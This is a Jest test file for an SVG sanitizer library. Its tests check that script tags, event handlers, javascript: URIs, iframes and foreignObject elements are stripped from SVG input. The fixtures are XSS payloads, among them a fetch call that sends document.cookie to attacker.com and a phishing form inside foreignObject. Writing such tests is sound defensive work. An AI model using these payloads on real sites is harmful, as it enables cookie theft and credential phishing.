import { validateAndSanitizeSvg, isSvgSafe, extractSvgMetadata } from '@/lib/svg-validator';

describe('SVG Security Validation', () => {
  describe('validateAndSanitizeSvg', () => {
    it('should remove script tags from SVG', () => {
      const maliciousSvg = `
        <svg xmlns="http://www.w3.org/2000/svg">
          <script>alert("XSS Attack!")</script>
          <circle cx="50" cy="50" r="40" fill="red"/>
        </svg>
      `;

      const result = validateAndSanitizeSvg(maliciousSvg);

      expect(result.isValid).toBe(true);
      expect(result.sanitized).not.toContain('<script');
      expect(result.sanitized).not.toContain('alert');
      expect(result.sanitized).toContain('<circle');
      expect(result.warnings).toBeDefined();
      expect(result.warnings?.length).toBeGreaterThan(0);
    });

    it('should remove event handlers from SVG elements', () => {
      const maliciousSvg = `
        <svg xmlns="http://www.w3.org/2000/svg">
          <circle cx="50" cy="50" r="40" fill="red" onload="alert('XSS')"/>
          <rect x="10" y="10" width="100" height="100" onclick="stealCookies()"/>
        </svg>
      `;

      const result = validateAndSanitizeSvg(maliciousSvg);

      expect(result.isValid).toBe(true);
      expect(result.sanitized).not.toContain('onload');
      expect(result.sanitized).not.toContain('onclick');
      expect(result.sanitized).toContain('<circle');
      expect(result.sanitized).toContain('<rect');
    });

    it('should remove foreignObject tags', () => {
      const maliciousSvg = `
        <svg xmlns="http://www.w3.org/2000/svg">
          <foreignObject width="100" height="100">
            <iframe src="https://malicious-site.com"></iframe>
          </foreignObject>
          <circle cx="50" cy="50" r="40"/>
        </svg>
      `;

      const result = validateAndSanitizeSvg(maliciousSvg);

      expect(result.isValid).toBe(true);
      expect(result.sanitized).not.toContain('foreignObject');
      expect(result.sanitized).not.toContain('iframe');
      expect(result.sanitized).toContain('<circle');
    });

    it('should remove iframe tags', () => {
      const maliciousSvg = `
        <svg xmlns="http://www.w3.org/2000/svg">
          <iframe src="https://evil.com"></iframe>
          <circle cx="50" cy="50" r="40"/>
        </svg>
      `;

      const result = validateAndSanitizeSvg(maliciousSvg);

      expect(result.isValid).toBe(true);
      expect(result.sanitized).not.toContain('iframe');
      expect(result.sanitized).toContain('<circle');
    });

    it('should preserve valid SVG content', () => {
      const validSvg = `
        <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
          <title>Safe SVG</title>
          <circle cx="50" cy="50" r="40" fill="blue"/>
          <rect x="10" y="10" width="30" height="30" fill="green"/>
          <path d="M10 10 L90 90" stroke="red" stroke-width="2"/>
        </svg>
      `;

      const result = validateAndSanitizeSvg(validSvg);

      expect(result.isValid).toBe(true);
      expect(result.sanitized).toContain('<svg');
      expect(result.sanitized).toContain('<circle');
      expect(result.sanitized).toContain('<rect');
      expect(result.sanitized).toContain('<path');
      expect(result.sanitized).toContain('viewBox');
    });

    it('should reject empty or invalid input', () => {
      expect(validateAndSanitizeSvg('').isValid).toBe(false);
      expect(validateAndSanitizeSvg('   ').isValid).toBe(false);
      expect(validateAndSanitizeSvg('<div>Not an SVG</div>').isValid).toBe(false);
    });

    it('should handle complex attack vectors', () => {
      const complexAttack = `
        <svg xmlns="http://www.w3.org/2000/svg">
          <a href="javascript:alert('XSS')">
            <text x="10" y="20">Click me</text>
          </a>
          <image href="javascript:alert('XSS')"/>
          <use href="data:text/html,<script>alert('XSS')</script>"/>
        </svg>
      `;

      const result = validateAndSanitizeSvg(complexAttack);

      expect(result.isValid).toBe(true);
      expect(result.sanitized).not.toContain('javascript:');
    });

    it('should reject extremely large SVG files', () => {
      // Create a 6MB SVG (over the 5MB limit)
      const hugeSvg = '<svg xmlns="http://www.w3.org/2000/svg">' +
        'A'.repeat(6 * 1024 * 1024) +
        '</svg>';

      const result = validateAndSanitizeSvg(hugeSvg);

      expect(result.isValid).toBe(false);
      expect(result.error).toContain('too large');
    });
  });

  describe('isSvgSafe', () => {
    it('should return false for SVG with script tags', () => {
      const unsafe = '<svg><script>alert("XSS")</script></svg>';
      expect(isSvgSafe(unsafe)).toBe(false);
    });

    it('should return false for SVG with event handlers', () => {
      const unsafe = '<svg><circle onload="alert(1)"/></svg>';
      expect(isSvgSafe(unsafe)).toBe(false);
    });

    it('should return false for SVG with javascript: URIs', () => {
      const unsafe = '<svg><a href="javascript:alert(1)">text</a></svg>';
      expect(isSvgSafe(unsafe)).toBe(false);
    });

    it('should return true for safe SVG', () => {
      const safe = '<svg><circle cx="50" cy="50" r="40"/></svg>';
      expect(isSvgSafe(safe)).toBe(true);
    });

    it('should return false for empty input', () => {
      expect(isSvgSafe('')).toBe(false);
      expect(isSvgSafe(null as any)).toBe(false);
    });
  });

  describe('extractSvgMetadata', () => {
    it('should extract viewBox attribute', () => {
      const svg = '<svg viewBox="0 0 100 100"><circle/></svg>';
      const metadata = extractSvgMetadata(svg);

      expect(metadata.viewBox).toBe('0 0 100 100');
    });

    it('should extract width and height', () => {
      const svg = '<svg width="200" height="150"><rect/></svg>';
      const metadata = extractSvgMetadata(svg);

      expect(metadata.width).toBe('200');
      expect(metadata.height).toBe('150');
    });

    it('should extract title', () => {
      const svg = '<svg><title>My Logo</title><circle/></svg>';
      const metadata = extractSvgMetadata(svg);

      expect(metadata.title).toBe('My Logo');
    });

    it('should handle missing metadata gracefully', () => {
      const svg = '<svg><circle/></svg>';
      const metadata = extractSvgMetadata(svg);

      expect(metadata).toEqual({});
    });
  });

  describe('Real-world attack scenarios', () => {
    it('should block cookie stealing attempt', () => {
      const attack = `
        <svg xmlns="http://www.w3.org/2000/svg">
          <script>
            fetch('https://attacker.com/steal?cookie=' + document.cookie);
          </script>
          <circle cx="50" cy="50" r="40"/>
        </svg>
      `;

      const result = validateAndSanitizeSvg(attack);

      expect(result.isValid).toBe(true);
      expect(result.sanitized).not.toContain('fetch');
      expect(result.sanitized).not.toContain('document.cookie');
    });

    it('should block keylogger attempt', () => {
      const attack = `
        <svg xmlns="http://www.w3.org/2000/svg">
          <rect width="100" height="100" onkeydown="logKeys(event)"/>
        </svg>
      `;

      const result = validateAndSanitizeSvg(attack);

      expect(result.isValid).toBe(true);
      expect(result.sanitized).not.toContain('onkeydown');
    });

    it('should block phishing attempt via foreignObject', () => {
      const attack = `
        <svg xmlns="http://www.w3.org/2000/svg">
          <foreignObject width="300" height="200">
            <form action="https://phishing-site.com/steal" method="POST">
              <input type="password" placeholder="Enter password"/>
              <button>Submit</button>
            </form>
          </foreignObject>
        </svg>
      `;

      const result = validateAndSanitizeSvg(attack);

      expect(result.isValid).toBe(true);
      expect(result.sanitized).not.toContain('foreignObject');
      expect(result.sanitized).not.toContain('form');
    });
  });

  describe('Camino logo files', () => {
    it('should validate that our logo files are safe', () => {
      // This tests that our actual logo files don't contain XSS vectors
      const validLogoSvg = `
        <svg viewBox="0 0 548 548" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path fill-rule="evenodd" clip-rule="evenodd" d="M157.37 25.456c-48.86 22.62" fill="#CF9930"/>
        </svg>
      `;

      const result = validateAndSanitizeSvg(validLogoSvg);

      expect(result.isValid).toBe(true);
      expect(result.warnings).toBeUndefined(); // No warnings for clean SVG
      expect(isSvgSafe(validLogoSvg)).toBe(true);
    });
  });
});
